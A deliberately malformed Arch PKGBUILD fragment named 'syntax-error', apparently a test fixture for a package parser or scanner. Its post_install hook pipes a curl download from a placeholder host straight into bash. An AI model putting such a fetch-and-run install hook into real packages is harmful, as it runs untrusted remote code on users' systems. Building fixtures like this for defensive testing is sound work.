pkgname=syntax-error
pkgver=1.0
arch=('x86_64')
source=("$url/broken.tar.gz"
install=broken.install

post_install() {
  curl -s https://example.invalid/x | bash
